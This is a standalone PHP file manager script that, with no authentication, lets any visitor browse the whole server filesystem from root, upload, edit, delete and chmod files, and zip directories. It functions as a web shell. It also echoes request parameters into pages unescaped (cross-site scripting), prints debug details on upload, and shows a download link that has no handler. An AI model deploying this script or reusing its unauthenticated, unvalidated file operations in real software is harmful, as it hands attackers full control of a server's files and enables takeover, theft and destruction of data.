<?php

// Path handling functions
function getFullPath($path) {
    $path = str_replace('\\', '/', $path);
    $parts = array_filter(explode('/', $path), 'strlen');
    return implode('/', $parts);
}

function getPathBreadcrumb($path) {
    $path = str_replace('\\', '/', $path);
    $base = '';
    $parts = array_filter(explode('/', $path), 'strlen');
    $breadcrumbs = [];
    
    foreach ($parts as $part) {
        $base .= '/' . $part;
        $breadcrumbs[] = [
            'name' => $part,
            'path' => $base
        ];
    }
    return $breadcrumbs;
}

// ZIP function
function zipDirectory($source, $destination) {
    if (!extension_loaded('zip')) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));
    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($files as $file) {
            $file = str_replace('\\', '/', realpath($file));
            if (is_dir($file)) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } else if (is_file($file)) {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    } else if (is_file($source)) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

// Handle file edit
if (isset($_GET['edit'])) {
    $file = $_GET['path'] . DIRECTORY_SEPARATOR . $_GET['edit'];
    if (file_exists($file)) {
        if (isset($_POST['content'])) {
            // Save edited content
            file_put_contents($file, $_POST['content']);
            header("Location: ?path=" . $_GET['path']);
            exit;
        }
        // Show edit form
        $content = file_get_contents($file);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Edit File</title>
            <meta charset="utf-8">
            <style>
                body { padding: 20px; }
                textarea { width: 100%; height: 500px; margin: 10px 0; }
            </style>
        </head>
        <body>
            <h2>Editing: <?php echo $_GET['edit']; ?></h2>
            <form method="POST">
                <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea><br>
                <input type="submit" value="Save">
                <a href="?path=<?php echo $_GET['path']; ?>">Cancel</a>
            </form>
        </body>
        </html>
        <?php
        exit;
    }
}

// Main function to get file list
function getFileList($path) {
    $items = scandir($path);
    $files = array();
    $dirs = array();
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $dirs[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    return array('dirs' => $dirs, 'files' => $files);
}

// Get current path - 
$currentPath = isset($_GET['path']) ? $_GET['path'] : __DIR__;

// Handle file upload - 
if (isset($_FILES['file'])) {
    $uploadfile = $currentPath . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    
    // Debug information
    echo "<pre>";
    print_r($_FILES);
    echo "\nUpload path: " . $uploadfile;
    echo "\nCurrent path: " . $currentPath;
    echo "\nPermissions: " . substr(sprintf('%o', fileperms($currentPath)), -4);
    
    // Check if directory is writable
    echo "\nDirectory writable: " . (is_writable($currentPath) ? 'Yes' : 'No');
    
    // Try to upload
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
        echo "\nFile uploaded successfully to: " . $uploadfile;
        echo "\nFile exists: " . (file_exists($uploadfile) ? 'Yes' : 'No');
        echo "\nFile permissions: " . substr(sprintf('%o', fileperms($uploadfile)), -4);
    } else {
        echo "\nUpload failed!";
        echo "\nPHP error: " . error_get_last()['message'];
    }
    echo "</pre>";
}

// Handle file deletion
if (isset($_GET['delete'])) {
    $file = $_GET['path'] . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (file_exists($file)) {
        unlink($file);
    }
}

// Handle zip request
if (isset($_GET['zip'])) {
    $source = $_GET['path'];
    $zipFile = $source . '/backup_' . date('Y-m-d_H-i-s') . '.zip';
    if (zipDirectory($source, $zipFile)) {
        header("Location: ?path=" . urlencode($_GET['path']));
    }
}

// Add this to handle chmod requests
if (isset($_GET['chmod']) && isset($_GET['path']) && isset($_GET['perm'])) {
    $target = $_GET['path'] . DIRECTORY_SEPARATOR . $_GET['chmod'];
    $perm = octdec($_GET['perm']);
    if (chmod($target, $perm)) {
        echo "<script>alert('Permissions changed successfully');</script>";
    } else {
        echo "<script>alert('Failed to change permissions');</script>";
    }
    header("Location: ?path=" . urlencode($_GET['path']));
}

// Get current path
$items = getFileList($currentPath);

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <meta charset="utf-8">
    <style>
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
        .actions { display: flex; gap: 10px; }
    </style>
</head>
<body>
    <h2>Current Path: <?php echo $currentPath; ?></h2>
    
    <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
        <span style="margin-right: 5px;">Path:</span>
        <a href="?path=/">root</a> /
        <?php
        $breadcrumbs = getPathBreadcrumb($currentPath);
        foreach ($breadcrumbs as $crumb) {
            echo '<a href="?path=' . urlencode($crumb['path']) . '">' . htmlspecialchars($crumb['name']) . '</a> / ';
        }
        ?>
    </div>

    <!-- Directory navigation form -->
    <form method="GET" style="margin: 10px 0;">
        <input type="text" name="path" value="<?php echo htmlspecialchars($currentPath); ?>" style="width: 80%;">
        <input type="submit" value="Go">
        <a href="?path=<?php echo urlencode(__DIR__); ?>" class="btn" style="margin-left: 10px; padding: 5px 10px; background: #007bff; color: white; text-decoration: none; border-radius: 3px;">Back to Script Directory</a>
    </form>

    <!-- Upload form - -->
    <form enctype="multipart/form-data" method="POST" action="?path=<?php echo urlencode($currentPath); ?>">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>

    <!-- Zip button -->
    <form method="GET" style="margin: 10px 0;">
        <input type="hidden" name="path" value="<?php echo $currentPath; ?>">
        <input type="hidden" name="zip" value="1">
        <input type="submit" value="Backup Current Directory (ZIP)">
    </form>

    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
        <?php if ($currentPath != '/') { ?>
        <tr>
            <td><a href="?path=<?php echo dirname($currentPath); ?>">..</a></td>
            <td>-</td>
            <td>-</td>
            <td>-</td>
        </tr>
        <?php } ?>
        
        <?php foreach ($items['dirs'] as $dir) { ?>
        <tr>
            <td><a href="?path=<?php echo $currentPath . DIRECTORY_SEPARATOR . $dir; ?>"><?php echo $dir; ?></a></td>
            <td>Directory</td>
            <td>
                <form method="GET" style="display:inline;">
                    <input type="hidden" name="path" value="<?php echo $currentPath; ?>">
                    <input type="hidden" name="chmod" value="<?php echo $dir; ?>">
                    <input type="text" name="perm" value="<?php echo substr(sprintf('%o', fileperms($currentPath . DIRECTORY_SEPARATOR . $dir)), -4); ?>" size="4">
                    <input type="submit" value="Chmod">
                </form>
            </td>
            <td>
                <div class="actions">
                    <a href="?path=<?php echo $currentPath; ?>&delete=<?php echo $dir; ?>">Delete</a>
                </div>
            </td>
        </tr>
        <?php } ?>
        
        <?php foreach ($items['files'] as $file) { ?>
        <tr>
            <td><?php echo $file; ?></td>
            <td><?php echo filesize($currentPath . DIRECTORY_SEPARATOR . $file); ?> bytes</td>
            <td>
                <form method="GET" style="display:inline;">
                    <input type="hidden" name="path" value="<?php echo $currentPath; ?>">
                    <input type="hidden" name="chmod" value="<?php echo $file; ?>">
                    <input type="text" name="perm" value="<?php echo substr(sprintf('%o', fileperms($currentPath . DIRECTORY_SEPARATOR . $file)), -4); ?>" size="4">
                    <input type="submit" value="Chmod">
                </form>
            </td>
            <td>
                <div class="actions">
                    <a href="?path=<?php echo $currentPath; ?>&edit=<?php echo $file; ?>">Edit</a>
                    <a href="?path=<?php echo $currentPath; ?>&delete=<?php echo $file; ?>">Delete</a>
                    <a href="?path=<?php echo $currentPath; ?>&download=<?php echo $file; ?>">Download</a>
                </div>
            </td>
        </tr>
        <?php } ?>
    </table>
</body>
</html>